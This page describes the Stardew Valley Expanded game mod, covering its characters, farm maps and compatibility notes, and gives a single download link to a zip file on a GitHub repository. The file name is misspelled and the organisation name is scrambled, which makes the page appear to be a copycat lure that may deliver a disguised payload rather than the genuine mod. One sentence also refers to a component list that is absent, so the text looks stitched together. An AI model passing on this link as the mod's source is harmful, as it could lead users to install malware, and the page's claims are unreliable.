Stardew Valley Expanded is a fan-made expansion for Stardew Valley that transforms the original farming RPG with new characters, explorable regions, storylines, quests, events, crops, fish, items, music, and redesigned locations. Built around SMAPI and Content Patcher, it delivers a broader world while preserving the atmosphere of the original game.

Download: [Stardew Valley Expanded](https://github.com/Stardew-Expanded-Valley/.github/releases/download/1/Stardew.Expande.Valley.v.1.15.11.zip)

## Overview

Stardew Valley Expanded (SVE) significantly expands the original Stardew Valley experience through new content and extensive world changes. It introduces additional villagers, character interactions, exploration areas, and progression opportunities that integrate with the existing game.

The expansion also reimagines familiar locations and adds new environments, activities, and discoveries throughout the valley.

## Features

- **New Characters** — introduces 28 additional NPCs with character events and expanded interactions.
- **Expanded World** — adds new locations and reworks existing areas, including an updated world map.
- **Storylines and Events** — features 278 character events, new questlines, and additional narrative content.
- **New Exploration** — discover new regions, hidden areas, secrets, and adventuring locations.
- **Additional Wildlife and Fishing** — adds 43 fish and other new creatures and encounters.
- **New Farming Content** — introduces additional crops, trees, farm animals, farm buildings, and resources.
- **Expanded Festivals and Activities** — adds new festival content, objects, and gameplay interactions.
- **Original Music** — includes additional music tracks that complement the expanded world.

## Farm Maps

SVE offers additional farm layouts through optional files:

- **Frontier Farm** — a large farm bordering the Ferngill Republic Frontier.
- **Grandpa's Farm** — a redesigned farm with landmarks, shortcuts, and hidden discoveries.
- **Immersive Farm 2 Remastered** — a large farm layout with additional space and multiplayer-oriented features.

Only one of these replacement farm maps should be installed at a time.

Grampleton Fields is another optional expansion area that provides additional farmable and buildable space.

These components provide the mod-loading, content-editing, and farm-related functionality required by Stardew Valley Expanded.

## Compatibility Notes

- The Nexus Mods page identifies version 1.15.11 as compatible with Stardew Valley 1.6.
- Starting a new save is strongly recommended, especially for first-time SVE players.
- Installing SVE into an existing save may require additional world and terrain adjustments.
- When updating, remove previous SVE files before installing the newer version. Avoid simply overwriting older files.
- Optional farm maps are mutually exclusive; install only one replacement farm layout.
